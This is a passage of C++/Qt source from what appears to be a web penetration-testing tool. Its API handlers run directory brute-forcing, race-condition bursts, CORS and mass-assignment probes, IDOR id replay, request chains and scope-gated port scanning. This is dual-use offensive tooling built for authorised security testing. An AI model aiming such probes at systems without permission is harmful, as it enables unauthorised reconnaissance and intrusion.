    // ---- Content / directory discovery -------------------------------
    // POST /api/content/discover { url, wordlist?: [...], max?, headers? }
    //   Brute-forces a wordlist of paths under the URL, soft-404-calibrated so
    //   a catch-all 200 server doesn't flag everything. Emits info findings for
    //   discovered paths. CWE-538. Scope-gated.
    if (path == "/api/content/discover") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::ContentDiscovery::Request cr;
        cr.host = u.host();
        cr.port = u.port(u.scheme() == "https" ? 443 : 80);
        cr.tls  = (u.scheme() == "https");
        cr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        const int mx = bodyJson.value("max").toInt(300);
        cr.maxRequests = qBound(1, mx, 2000);
        for (const QJsonValue &v : bodyJson.value("wordlist").toArray())
            if (!v.toString().isEmpty()) cr.wordlist.append(v.toString());
        const QJsonObject chdrs = bodyJson.value("headers").toObject();
        for (auto it = chdrs.begin(); it != chdrs.end(); ++it)
            cr.headers.append({ it.key(), it.value().toString() });

        const auto cres = Nullock::Core::ContentDiscovery::discover(cr);

        QJsonArray hits;
        for (const auto &h : cres.hits) {
            hits.append(QJsonObject{
                { "path", h.path }, { "status", h.status }, { "size", h.size },
                { "location", h.location }, { "note", h.note } });
            if (m_wiring.scanner)
                m_wiring.scanner->reportFinding(0, "info", "content-discovered",
                    QString("Discovered path %1 (%2 %3)").arg(h.path).arg(h.status).arg(h.note),
                    QString("wordlist brute-force; %1 bytes%2").arg(h.size)
                        .arg(h.location.isEmpty() ? QString() : " -> " + h.location),
                    cr.host, url);
        }
        return okJson({{ "ok", cres.error.isEmpty() },
                       { "error", cres.error },
                       { "softNotFoundStatus", cres.softNotFoundStatus },
                       { "softNotFoundIs200", cres.softNotFoundIs200 },
                       { "requestsSent", cres.requestsSent },
                       { "hitCount", static_cast<int>(cres.hits.size()) },
                       { "hits", hits }});
    }

    // ---- Team workspace sync (client side) ---------------------------
    // POST /api/workspace/push { url, key, engagement, author? }
    // POST /api/workspace/pull { url, key, engagement, since? }
    //   The client half of the nullock-workspace server: push this instance's
    //   local findings to a shared workspace, or pull teammates' findings and
    //   import them. The workspace URL/key are the user's own infrastructure
    //   (not a scan target), so these are NOT scope-gated.
    if (path == "/api/workspace/push" || path == "/api/workspace/pull") {
        const QString wsUrl = bodyJson.value("url").toString();
        const QString key   = bodyJson.value("key").toString();
        const QString eng   = bodyJson.value("engagement").toString();
        const QUrl u(wsUrl);
        if (wsUrl.isEmpty() || !u.isValid() || u.host().isEmpty() || eng.isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url and engagement required" }});
        // The key goes into an outbound request header -- a CR/LF would let it
        // inject extra headers into the request to the workspace.
        if (key.contains('\r') || key.contains('\n'))
            return okJson({{ "ok", false }, { "error", "key contains illegal characters" }});
        if (!m_wiring.scanner)
            return okJson({{ "ok", false }, { "error", "no scanner wired" }});
        const QString wsHost = u.host();
        const quint16 wsPort = static_cast<quint16>(u.port(u.scheme() == "https" ? 443 : 80));
        const bool wsTls = (u.scheme() == "https");
        Nullock::Core::HttpClient client;

        if (path == "/api/workspace/push") {
            // Serialize local findings, deduped by the shared identity key.
            QJsonArray arr; QSet<QString> seen; const QChar sep(QChar(0x1f));
            for (const auto &f : m_wiring.scanner->findings(0)) {
                const QString k = f.kind + sep + f.host + sep + f.url + sep + f.summary;
                if (seen.contains(k)) continue; seen.insert(k);
                arr.append(QJsonObject{
                    { "kind", f.kind }, { "host", f.host }, { "url", f.url },
                    { "summary", f.summary }, { "severity", f.severity },
                    { "cwe", f.cwe }, { "owasp", f.owasp },
                    { "cvssScore", f.cvssScore }, { "fixSummary", f.fixSummary } });
            }
            if (arr.isEmpty())
                return okJson({{ "ok", false }, { "error", "no local findings to push" }});
            const QByteArray payload = QJsonDocument(QJsonObject{
                { "engagement", eng }, { "author", bodyJson.value("author").toString() },
                { "findings", arr } }).toJson(QJsonDocument::Compact);
            QByteArray rq = "POST /api/ws/push HTTP/1.1\r\n";
            rq += "Host: " + wsHost.toUtf8() + "\r\n";
            rq += "Content-Type: application/json\r\nAccept-Encoding: identity\r\n";
            rq += "X-Workspace-Key: " + key.toUtf8() + "\r\n";
            rq += "Content-Length: " + QByteArray::number(payload.size()) + "\r\n";
            rq += "Connection: close\r\n\r\n"; rq += payload;
            const auto r = client.send(wsHost, wsPort, wsTls, rq);
            if (!r.ok) return okJson({{ "ok", false }, { "error", "workspace unreachable: " + r.errorMessage }});
            const QJsonObject resp = QJsonDocument::fromJson(r.parsed.body).object();
            return okJson({{ "ok", resp.value("ok").toBool() && r.parsed.statusCode == 200 },
                           { "status", r.parsed.statusCode }, { "pushed", arr.size() },
                           { "accepted", resp.value("accepted").toInt() },
                           { "newSeq", resp.value("newSeq") },
                           { "workspaceError", resp.value("error") }});
        }

        // pull
        const qint64 since = static_cast<qint64>(bodyJson.value("since").toDouble(0));
        QByteArray rq = "GET /api/ws/pull?engagement=" + QUrl::toPercentEncoding(eng)
                      + "&since=" + QByteArray::number(since) + " HTTP/1.1\r\n";
        rq += "Host: " + wsHost.toUtf8() + "\r\n";
        rq += "Accept-Encoding: identity\r\nX-Workspace-Key: " + key.toUtf8() + "\r\n";
        rq += "Connection: close\r\n\r\n";
        const auto r = client.send(wsHost, wsPort, wsTls, rq);
        if (!r.ok) return okJson({{ "ok", false }, { "error", "workspace unreachable: " + r.errorMessage }});
        const QJsonObject resp = QJsonDocument::fromJson(r.parsed.body).object();
        if (r.parsed.statusCode != 200 || !resp.value("ok").toBool())
            return okJson({{ "ok", false }, { "status", r.parsed.statusCode },
                           { "error", resp.value("error").toString("workspace rejected the pull") }});
        int imported = 0;
        for (const QJsonValue &fv : resp.value("findings").toArray()) {
            const QJsonObject f = fv.toObject();
            if (f.value("kind").toString().isEmpty()) continue;
            m_wiring.scanner->reportFinding(0, f.value("severity").toString("info"),
                f.value("kind").toString(), f.value("summary").toString(),
                "imported from workspace engagement '" + eng + "'",
                f.value("host").toString(), f.value("url").toString());
            ++imported;
        }
        return okJson({{ "ok", true }, { "imported", imported },
                       { "seq", resp.value("seq") }});
    }

    // ---- Race-condition tester ---------------------------------------
    // POST /api/race/test { url, method?, body?, contentType?, headers?,
    //                       count?, successStatusMin?, successStatusMax?,
    //                       successMatch? }
    //   Fires `count` concurrent copies and flags a limited-use operation
    //   that leaked extra successes (1 < successes < count). The single-
    //   packet / Turbo-Intruder class, in the core.
    if (path == "/api/race/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::RaceTester::Request rr;
        rr.host = u.host();
        rr.port = u.port(u.scheme() == "https" ? 443 : 80);
        rr.tls  = (u.scheme() == "https");
        rr.method = httpMethodFromJson(bodyJson, "POST");
        rr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            rr.basePath += "?" + u.query(QUrl::FullyEncoded);
        rr.body = bodyJson.value("body").toString().toUtf8();
        rr.contentType = contentTypeFromJson(bodyJson, "application/json");
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            rr.headers.append({ it.key(), it.value().toString() });

        const int count = bodyJson.value("count").toInt(20);
        const int smin  = bodyJson.value("successStatusMin").toInt(200);
        const int smax  = bodyJson.value("successStatusMax").toInt(299);
        const QString smatch = bodyJson.value("successMatch").toString();

        // test() runs its own dedicated thread pool and blocks until the
        // burst completes, so call it directly -- no outer QtConcurrent wrap.
        const auto rres = Nullock::Core::RaceTester::test(rr, count, smin, smax, smatch);

        QJsonObject hist;
        for (auto it = rres.statusHistogram.cbegin(); it != rres.statusHistogram.cend(); ++it)
            hist.insert(QString::number(it.key()), it.value());
        if (m_wiring.scanner && rres.raceSuspected) {
            m_wiring.scanner->reportFinding(0, "high", "race-condition-suspect",
                QString("Race condition: %1 of %2 concurrent requests succeeded alongside "
                        "409/422 contention rejections -- a limited-use operation appears to "
                        "have granted extra successes under concurrency")
                    .arg(rres.successCount).arg(rres.count),
                "confirm the action is single-use (one request should win, the rest 409); "
                "status histogram: " + QString::fromUtf8(QJsonDocument(hist).toJson(QJsonDocument::Compact)),
                u.host(), url);
        } else if (m_wiring.scanner && rres.overGrantSuspected) {
            // Every concurrent write won and none was rejected -- a possible
            // unguarded over-grant, but only a race if the action SHOULD be
            // single-use (a normal non-limited write also all-succeeds). Lead.
            m_wiring.scanner->reportFinding(0, "medium", "race-condition-suspect",
                QString("Possible over-grant race: all %1 concurrent %2 requests succeeded "
                        "with no rejection -- if this is a single-use action, it admitted "
                        "every concurrent attempt")
                    .arg(rres.count).arg(rr.method),
                "NOT confirmed: a non-limited write also all-succeeds. Confirm the action is "
                "single-use (sequentially, request #2 should be rejected); status histogram: "
                + QString::fromUtf8(QJsonDocument(hist).toJson(QJsonDocument::Compact)),
                u.host(), url);
        }
        return okJson({{ "ok", rres.error.isEmpty() },
                       { "error", rres.error },
                       { "count", rres.count },
                       { "successCount", rres.successCount },
                       { "rejectionCount", rres.rejectionCount },
                       { "otherClientError", rres.otherClientError },
                       { "rateLimited", rres.rateLimited },
                       { "serverError", rres.serverError },
                       { "transportFail", rres.transportFail },
                       { "raceSuspected", rres.raceSuspected },
                       { "overGrantSuspected", rres.overGrantSuspected },
                       { "inconclusive", rres.inconclusive },
                       { "allSucceeded", rres.allSucceeded },
                       { "statusHistogram", hist }});
    }

    // ---- JS recon: endpoints + source-map exposure -------------------
    // POST /api/jsrecon/scan { url, headers?: {}, maxScripts? }
    //   Mines the page's same-origin JS bundles for API endpoints and
    //   flags any exposed source maps (which leak original source).
    if (path == "/api/jsrecon/scan") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::JsRecon::Request jr;
        jr.host = u.host();
        jr.port = u.port(u.scheme() == "https" ? 443 : 80);
        jr.tls  = (u.scheme() == "https");
        jr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            jr.basePath += "?" + u.query(QUrl::FullyEncoded);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            jr.headers.append({ it.key(), it.value().toString() });
        const int maxScripts = bodyJson.value("maxScripts").toInt(20);

        Nullock::Core::JsRecon::Result jres;
        {
            auto fut = QtConcurrent::run([jr, maxScripts]() {
                return Nullock::Core::JsRecon::scan(jr, maxScripts);
            });
            fut.waitForFinished();
            jres = fut.result();
        }

        QJsonArray endpoints;
        for (const QString &e : jres.endpoints) endpoints.append(e);
        QJsonArray scripts;
        for (const QString &s : jres.scripts) scripts.append(s);
        QJsonArray crossOrigin;
        for (const QString &s : jres.crossOriginScripts) crossOrigin.append(s);
        QJsonArray maps;
        for (const auto &m : jres.sourceMaps) {
            QJsonArray srcs;
            for (const QString &s : m.sources) srcs.append(s);
            maps.append(QJsonObject{
                { "jsUrl", m.jsUrl }, { "mapUrl", m.mapUrl },
                { "accessible", m.accessible }, { "sources", srcs } });
            if (m_wiring.scanner && m.accessible) {
                m_wiring.scanner->reportFinding(0, "medium", "source-map-exposed",
                    QString("Source map exposed: %1 leaks %2 original source file(s)")
                        .arg(m.mapUrl).arg(m.sources.size()),
                    "first sources: " + m.sources.mid(0, 5).join(", "),
                    u.host(), url);
            }
        }
        return okJson({{ "ok", jres.error.isEmpty() },
                       { "error", jres.error },
                       { "requestsSent", jres.requestsSent },
                       { "scripts", scripts },
                       { "crossOriginScripts", crossOrigin },
                       { "endpointCount", static_cast<int>(jres.endpoints.size()) },
                       { "endpoints", endpoints },
                       { "sourceMaps", maps }});
    }

    // ---- Active CORS exploitability ----------------------------------
    // POST /api/cors/test { url, method?, headers?: {} }
    //   Fires an Origin battery and classifies ACAO/ACAC. Proves whether a
    //   cross-origin attacker can read the response (vs the passive scanner
    //   which only notices a reflection that already happened).
    if (path == "/api/cors/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::CorsTester::Request cr;
        cr.host = u.host();
        cr.port = u.port(u.scheme() == "https" ? 443 : 80);
        cr.tls  = (u.scheme() == "https");
        cr.method = httpMethodFromJson(bodyJson, "GET");
        cr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            cr.basePath += "?" + u.query(QUrl::FullyEncoded);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            cr.headers.append({ it.key(), it.value().toString() });

        Nullock::Core::CorsTester::Result cres;
        {
            auto fut = QtConcurrent::run([cr]() {
                return Nullock::Core::CorsTester::test(cr);
            });
            fut.waitForFinished();
            cres = fut.result();
        }

        QJsonArray probes;
        for (const auto &p : cres.probes) {
            probes.append(QJsonObject{
                { "origin", p.origin }, { "label", p.label },
                { "acao", p.acao }, { "credentials", p.credentials },
                { "reflected", p.reflected }, { "severity", p.severity },
                { "kind", p.kind } });
            if (m_wiring.scanner && !p.severity.isEmpty()) {
                m_wiring.scanner->reportFinding(0, p.severity, p.kind,
                    QString("CORS: %1 origin '%2' reflected%3")
                        .arg(p.label, p.origin,
                             p.credentials ? " WITH credentials" : ""),
                    "ACAO=" + p.acao + " ACAC=" + (p.credentials ? "true" : "false"),
                    u.host(), url);
            }
        }
        return okJson({{ "ok", cres.error.isEmpty() },
                       { "error", cres.error },
                       { "requestsSent", cres.requestsSent },
                       { "findingCount", cres.findingCount },
                       { "probes", probes }});
    }

    // ---- Mass assignment / auto-binding ------------------------------
    // POST /api/massassign/test { url, method?, body?, contentType?,
    //                            headers?: {}, fields?: [...] }
    //   Injects privileged field names into the write request and reports
    //   the ones the server accepts (echoes our marker back). OWASP API #6;
    //   Burp has no native scanner for it.
    if (path == "/api/massassign/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::MassAssign::Request mr;
        mr.host = u.host();
        mr.port = u.port(u.scheme() == "https" ? 443 : 80);
        mr.tls  = (u.scheme() == "https");
        mr.method = httpMethodFromJson(bodyJson, "POST");
        mr.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            mr.basePath += "?" + u.query(QUrl::FullyEncoded);
        mr.body = bodyJson.value("body").toString().toUtf8();
        mr.contentType = contentTypeFromJson(bodyJson);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            mr.headers.append({ it.key(), it.value().toString() });

        QStringList fields;
        for (const QJsonValue &v : bodyJson.value("fields").toArray())
            fields << v.toString();
        if (fields.isEmpty())
            fields = Nullock::Core::MassAssign::defaultFields();
        if (fields.size() > 1000) fields = fields.mid(0, 1000);

        Nullock::Core::MassAssign::Result ma;
        {
            auto fut = QtConcurrent::run([mr, fields]() {
                return Nullock::Core::MassAssign::test(mr, fields);
            });
            fut.waitForFinished();
            ma = fut.result();
        }

        QJsonArray found;
        QStringList accepted;
        for (const auto &f : ma.found) {
            found.append(QJsonObject{{ "field", f.field }, { "marker", f.marker }});
            accepted << f.field;
        }
        if (m_wiring.scanner && !ma.found.isEmpty()) {
            m_wiring.scanner->reportFinding(0, "high", "mass-assignment",
                QString("Mass assignment: endpoint accepted privileged field(s) %1")
                    .arg(accepted.join(", ")),
                "injected fields were echoed back in a successful (2xx) response object "
                "(confirm persistence with a follow-up re-fetch)",
                u.host(), url);
        }
        return okJson({{ "ok", ma.error.isEmpty() },
                       { "error", ma.error },
                       { "bodyKind", ma.bodyKind },
                       { "requestsSent", ma.requestsSent },
                       { "fieldsTried", ma.fieldsTried },
                       { "reflectionUsable", ma.reflectionUsable },
                       { "foundCount", static_cast<int>(ma.found.size()) },
                       { "found", found }});
    }

    // ---- IDOR / BOLA auto-detection ----------------------------------
    // POST /api/idor/test { url, method?, idParam?, headers?: {} }
    //   Finds numeric object ids in the URL, replays with neighboring ids
    //   under the same session, and reports neighbors that return a
    //   distinct valid object (a horizontal IDOR lead). headers carries
    //   the session cookies / Authorization so the test runs authenticated.
    if (path == "/api/idor/test") {
        const QString url = bodyJson.value("url").toString();
        const QUrl u(url);
        if (url.isEmpty() || !u.isValid() || u.host().isEmpty())
            return okJson({{ "ok", false }, { "error", "valid url required" }});

        Nullock::Core::IdorTester::Request ir;
        ir.host = u.host();
        ir.port = u.port(u.scheme() == "https" ? 443 : 80);
        ir.tls  = (u.scheme() == "https");
        ir.method = httpMethodFromJson(bodyJson, "GET");
        ir.basePath = u.path(QUrl::FullyEncoded).isEmpty()
                      ? QStringLiteral("/") : u.path(QUrl::FullyEncoded);
        if (!u.query(QUrl::FullyEncoded).isEmpty())
            ir.basePath += "?" + u.query(QUrl::FullyEncoded);
        const QJsonObject hdrs = bodyJson.value("headers").toObject();
        for (auto it = hdrs.begin(); it != hdrs.end(); ++it)
            ir.headers.append({ it.key(), it.value().toString() });
        const QString idParam = bodyJson.value("idParam").toString();

        Nullock::Core::IdorTester::Result tr;
        {
            auto fut = QtConcurrent::run([ir, idParam]() {
                return Nullock::Core::IdorTester::test(ir, idParam);
            });
            fut.waitForFinished();
            tr = fut.result();
        }

        QJsonArray findings;
        for (const auto &f : tr.findings) {
            QJsonArray accessible;
            QStringList ids;
            for (const auto &a : f.accessible) {
                accessible.append(QJsonObject{
                    { "id", a.mutatedId }, { "status", a.status }, { "length", a.length } });
                ids << a.mutatedId;
            }
            findings.append(QJsonObject{
                { "location", f.loc.descriptor },
                { "originalId", f.loc.originalValue },
                { "accessible", accessible } });
            // A single session proves only that the id space is ENUMERABLE,
            // not that the access is unauthorized (a public catalog is
            // enumerable by design). So this is a low-severity LEAD, not a
            // confirmed horizontal IDOR -- confirm with /api/authz-test, which
            // replays under a second (lower-privilege) identity.
            if (m_wiring.scanner) {
                m_wiring.scanner->reportFinding(0, "low", "idor-enumerable",
                    QString("Enumerable object ids: %1 (id=%2) returns distinct objects for neighbors %3")
                        .arg(f.loc.descriptor, f.loc.originalValue, ids.join(", ")),
                    "same-session replay of neighboring ids returned distinct valid objects -- "
                    "NOT confirmed unauthorized; confirm with a multi-identity replay (/api/authz-test)",
                    u.host(), url);
            }
        }
        return okJson({{ "ok", tr.error.isEmpty() },
                       { "error", tr.error },
                       { "idLocationsFound", tr.idLocationsFound },
                       { "requestsSent", tr.requestsSent },
                       { "findingCount", static_cast<int>(tr.findings.size()) },
                       // Single-session leads grade low ("enumerable", not a
                       // confirmed authorization break) -- empty when no lead.
                       { "severity", tr.findings.isEmpty() ? QString() : QStringLiteral("low") },
                       { "kind", tr.findings.isEmpty() ? QString() : QStringLiteral("idor-enumerable") },
                       { "findings", findings }});
    }

    // ---- Repeater chains ---------------------------------------------
    // POST /api/chain/run
    //   { continueOnError?: false,
    //     steps: [ { name, host, port, tls, request,
    //                extract: [ { var, from: "header"|"cookie"|"json"|
    //                                    "regex"|"status", key } ] } ] }
    //
    // Runs the steps in order, threading {{var}} values extracted from
    // each response into the next request. Returns every step's status,
    // timing, and the values it extracted. Postman-style chaining that
    // Burp lacks natively.
    //
    // This handler blocks until the whole chain finishes so the caller
    // gets results in one round-trip. Two consequences: (1) a long chain
    // briefly stalls other control requests, and (2) a step must NOT
    // target this control server's own port -- that self-loops into a
    // deadlock (we're busy waiting for the chain we'd need to serve).
    // Chains target the app under test, so this is a non-issue in practice.
    if (path == "/api/chain/run") {
        const QJsonArray stepsArr = bodyJson.value("steps").toArray();
        if (stepsArr.isEmpty())
            return okJson({{ "ok", false }, { "error", "steps[] required" }});
        if (stepsArr.size() > 50)
            return okJson({{ "ok", false }, { "error", "max 50 steps" }});

        QList<Nullock::Core::ChainRunner::Step> steps;
        for (const QJsonValue &sv : stepsArr) {
            const QJsonObject so = sv.toObject();
            Nullock::Core::ChainRunner::Step st;
            st.name = so.value("name").toString();
            st.host = so.value("host").toString();
            st.port = so.value("port").toInt(so.value("tls").toBool(true) ? 443 : 80);
            st.tls  = so.value("tls").toBool(true);
            st.request = so.value("request").toString().toUtf8();
            if (st.host.isEmpty() || st.request.isEmpty())
                return okJson({{ "ok", false },
                               { "error", "each step needs host + request" }});
            if (blocksScope(st.host))   // ScopeGuard: no chained requests off-scope
                return okJson({{ "ok", false }, { "scopeBlocked", true },
                               { "error", "step host '" + st.host + "' is out of scope" }});
            for (const QJsonValue &ev : so.value("extract").toArray()) {
                const QJsonObject eo = ev.toObject();
                Nullock::Core::ChainRunner::Extract ex;
                ex.var = eo.value("var").toString();
                ex.key = eo.value("key").toString();
                const QString from = eo.value("from").toString("header").toLower();
                if      (from == "cookie") ex.from = Nullock::Core::ChainRunner::Extract::Cookie;
                else if (from == "json")   ex.from = Nullock::Core::ChainRunner::Extract::Json;
                else if (from == "regex")  ex.from = Nullock::Core::ChainRunner::Extract::Regex;
                else if (from == "status") ex.from = Nullock::Core::ChainRunner::Extract::Status;
                else                       ex.from = Nullock::Core::ChainRunner::Extract::Header;
                st.extracts.append(ex);
            }
            steps.append(st);
        }

        const bool continueOnError = bodyJson.value("continueOnError").toBool(false);
        // Chains are sequential network I/O; run off the GUI thread but
        // block this control request until done so the caller gets results.
        Nullock::Core::ChainRunner::Result r;
        {
            auto future = QtConcurrent::run([steps, continueOnError]() {
                return Nullock::Core::ChainRunner::run(steps, continueOnError);
            });
            future.waitForFinished();
            r = future.result();
        }

        QJsonArray stepsOut;
        for (const auto &sr : r.steps) {
            QJsonObject eo;
            for (auto it = sr.extracted.cbegin(); it != sr.extracted.cend(); ++it)
                eo.insert(it.key(), it.value());
            stepsOut.append(QJsonObject{
                { "name", sr.name },
                { "ok", sr.ok },
                { "status", sr.status },
                { "ms", static_cast<double>(sr.ms) },
                { "requestSize", sr.requestSize },
                { "responseSize", sr.responseSize },
                { "error", sr.error },
                { "extracted", eo },
                { "responsePreview", QString::fromUtf8(sr.responsePreview) },
            });
        }
        QJsonObject varsOut;
        for (auto it = r.vars.cbegin(); it != r.vars.cend(); ++it)
            varsOut.insert(it.key(), it.value());
        return okJson({{ "ran", static_cast<int>(r.steps.size()) },
                       { "steps", stepsOut },
                       { "vars", varsOut }});
    }

    // ---- port scanner ------------------------------------------------
    // POST /api/portscan/start { host | hosts | cidr, preset|ports,
    //                            timeoutMs?, parallel?, banner? }
    //   preset = "discovery" | "top100" | "web" | "full1024" | custom
    if (path == "/api/portscan/start") {
        if (!m_wiring.portScanner)
            return okJson({{ "ok", false }, { "error", "no port scanner" }});
        Nullock::Core::ScanRequest sr;
        sr.host = bodyJson.value("host").toString();
        sr.timeoutMs = bodyJson.value("timeoutMs").toInt(1500);
        sr.parallel  = bodyJson.value("parallel").toInt(64);
        sr.grabBanner = bodyJson.value("banner").toBool(true);
        sr.throttleMs = bodyJson.value("throttleMs").toInt(0);
        sr.randomize  = bodyJson.value("randomize").toBool(false);

        // Clamp to sane bounds. parallel was previously taken raw; a
        // malicious or buggy caller specifying parallel=100000 launched
        // a thread per probe with no upper cap on concurrent sockets.
        if (sr.parallel  < 1)    sr.parallel  = 1;
        if (sr.parallel  > 256)  sr.parallel  = 256;
        if (sr.timeoutMs < 50)   sr.timeoutMs = 50;
        if (sr.timeoutMs > 30000) sr.timeoutMs = 30000;
        if (sr.throttleMs < 0)   sr.throttleMs = 0;
        if (sr.throttleMs > 60000) sr.throttleMs = 60000;

        // Multi-host modes. hosts[] is just a JSON array. cidr is
        // expanded server-side -- accepts "192.168.1.0/24" through
        // "10.0.0.0/16" (caps at /16 = 65k hosts to keep us from
        // immolating ourselves). The single-host form sr.host is
        // already populated above.
        for (const QJsonValue &v : bodyJson.value("hosts").toArray()) {
            const QString h = v.toString().trimmed();
            if (!h.isEmpty()) sr.hosts.append(h);
        }
        const QString cidr = bodyJson.value("cidr").toString().trimmed();
        if (!cidr.isEmpty()) {
            const int slash = cidr.indexOf('/');
            if (slash > 0) {
                const QString netStr = cidr.left(slash);
                const int bits = cidr.mid(slash + 1).toInt();
                const QStringList octets = netStr.split('.');
                if (octets.size() == 4 && bits >= 16 && bits <= 32) {
                    quint32 net = 0;
                    bool ok = true;
                    for (int i = 0; i < 4 && ok; ++i) {
                        const int v = octets[i].toInt(&ok);
                        if (v < 0 || v > 255) { ok = false; break; }
                        net = (net << 8) | static_cast<quint32>(v);
                    }
                    if (ok) {
                        const quint32 mask = bits == 32 ? 0xFFFFFFFFu
                                              : (~0u) << (32 - bits);
                        const quint32 base = net & mask;
                        const quint32 size = bits == 32 ? 1
                                              : (1u << (32 - bits));
                        // Skip network + broadcast for /<31. /31 and /32
                        // hand back everything (point-to-point / single).
                        const quint32 startI = (bits < 31) ? 1u : 0u;
                        const quint32 endI   = (bits < 31) ? size - 1u : size;
                        for (quint32 i = startI; i < endI; ++i) {
                            const quint32 ip = base + i;
                            sr.hosts.append(QString("%1.%2.%3.%4")
                                .arg((ip >> 24) & 0xff)
                                .arg((ip >> 16) & 0xff)
                                .arg((ip >> 8)  & 0xff)
                                .arg(ip        & 0xff));
                        }
                    }
                }
            }
        }

        // Curated presets so the user can hit "top 100 ports" in one click.
        const QString preset = bodyJson.value("preset").toString();
        QList<quint16> ports;
        if (preset == "discovery") {
            // The "is anything alive at this IP" set -- four ports that
            // catch ~95% of internet-exposed boxes. Fast.
            ports = { 22, 80, 443, 3389 };
        } else if (preset == "top100") {
            // Nmap's --top-ports 100 list, sorted for grep-friendliness.
            ports = { 7, 21, 22, 23, 25, 26, 53, 80, 81, 110, 111,
                113, 119, 135, 139, 143, 144, 179, 199, 389, 427,
                443, 444, 445, 465, 513, 514, 515, 543, 544, 548,
                554, 587, 631, 646, 873, 990, 993, 995, 1025, 1026,
                1027, 1028, 1029, 1110, 1433, 1720, 1723, 1755,
                1900, 2000, 2001, 2049, 2121, 2717, 3000, 3128, 3306,
                3389, 3986, 4899, 5000, 5009, 5051, 5060, 5101, 5190,
                5357, 5432, 5631, 5666, 5800, 5900, 6000, 6001, 6646,
                7070, 8000, 8008, 8009, 8080, 8081, 8443, 8888, 9100,
                9999, 10000, 32768, 49152, 49153, 49154, 49155, 49156,
                49157, 1024, 1027, 1029, 1110, 1433, 8443 };
        } else if (preset == "web") {
            ports = { 80, 81, 88, 443, 591, 631, 1080, 2375, 3000,
                4443, 4567, 5000, 5601, 5985, 5986, 6443, 7474,
                8000, 8001, 8008, 8009, 8080, 8081, 8086, 8088,
                8161, 8181, 8443, 8500, 8530, 8531, 8800, 8834,
                8880, 8888, 9000, 9090, 9091, 9200, 9418, 9443,
                15672, 27017 };
        } else if (preset == "full1024") {
            for (quint16 p = 1; p <= 1024; ++p) ports.append(p);
        } else {
            for (const QJsonValue &v : bodyJson.value("ports").toArray()) {
                const int p = v.toInt(0);
                if (p > 0 && p < 65536) ports.append(static_cast<quint16>(p));
            }
        }
        sr.ports = ports;

        // Hard cap on total work. host * port can blow up fast: a /16
        // (~65k hosts) with full1024 = ~67M probes. Refuse anything past
        // 100k tasks; user can re-issue smaller chunks.
        // ScopeGuard: drop out-of-scope hosts so a scan can't be aimed off-scope.
        // Partial overlap proceeds with the in-scope subset; all-out is refused.
        {
            const bool hadTarget = !sr.host.isEmpty() || !sr.hosts.isEmpty();
            if (blocksScope(sr.host)) sr.host.clear();
            QStringList kept;
            for (const QString &h : sr.hosts) if (!blocksScope(h)) kept.append(h);
            sr.hosts = kept;
            if (hadTarget && sr.host.isEmpty() && sr.hosts.isEmpty())
                return okJson({{ "ok", false }, { "scopeBlocked", true },
                    { "error", "all scan targets are out of scope; add them to Scope first" }});
        }

        constexpr int kMaxScanTasks = 100'000;
        const qint64 tasks = static_cast<qint64>(sr.hosts.size()) * sr.ports.size();
        if (tasks > kMaxScanTasks) {
            return okJson({
                { "ok", false },
                { "error", QString("scan too large: %1 probes (cap %2)")
                              .arg(tasks).arg(kMaxScanTasks) },
            });
        }
        const bool ok = m_wiring.portScanner->start(sr);
        return okJson({{ "ok", ok }, { "count", ports.size() }});
    }
    if (path == "/api/portscan/stop") {
        if (m_wiring.portScanner) m_wiring.portScanner->stop();
        return okJson();
    }
    if (path == "/api/portscan/clear") {
        if (m_wiring.portScanner) m_wiring.portScanner->clear();
        return okJson();
    }

    // ---- scan -> findings bridge -------------------------------------
    // POST /api/portscan/to-findings
    //   { includeOpenPorts?: bool=true, correlateCves?: bool=true }
    // Turns the port scanner's *current* results into first-class findings
    // (exposed database / remote-admin / management API / cleartext /
    // file-share, plus banner->CVE correlation) so the network layer rides
    // into the same findings list, report, SARIF export, and enrichment as
    // every web finding. Makes NO network requests -- it only classifies
    // results already gathered (the scan was scope-gated at start), so it
    // needs no ScopeGuard entry of its own.
    if (path == "/api/portscan/to-findings") {
        if (!m_wiring.portScanner)
            return okJson({{ "ok", false }, { "error", "no port scanner" }});
        if (!m_wiring.scanner)
            return okJson({{ "ok", false }, { "error", "no passive scanner wired" }});

        Nullock::Core::ScanBridge::Options opt;
